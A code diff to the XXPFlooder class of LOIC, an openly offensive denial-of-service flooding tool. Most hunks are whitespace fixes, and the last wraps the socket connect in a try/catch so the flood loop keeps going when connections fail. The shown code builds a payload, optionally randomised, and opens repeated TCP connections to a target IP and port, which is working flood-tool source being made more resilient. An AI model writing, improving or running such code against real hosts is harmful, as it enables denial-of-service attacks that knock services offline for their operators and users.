@@ -14,7 +14,7 @@ namespace LOIC
 		public int Delay { get; set; }
 		public bool Resp { get; set; }
 		public string Data { get; set; }
-        	private bool random;
+		private bool random;
 
 		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
 		{
@@ -37,13 +37,13 @@ namespace LOIC
 		{
 			try
 			{
-        	        	byte[] buf;
+				byte[] buf;
 				if (random == true)
 				{
 					buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, new Functions().RandomString()));
 				}
 				else
-		                {
+				{
 					buf = System.Text.Encoding.ASCII.GetBytes(Data);
 				}
 
@@ -55,7 +55,10 @@ namespace LOIC
 					{
 						socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 						socket.NoDelay = true;
-						socket.Connect(RHost);
+
+						try { socket.Connect(RHost); }
+						catch { continue; }
+
 						socket.Blocking = Resp;
 						try
 						{
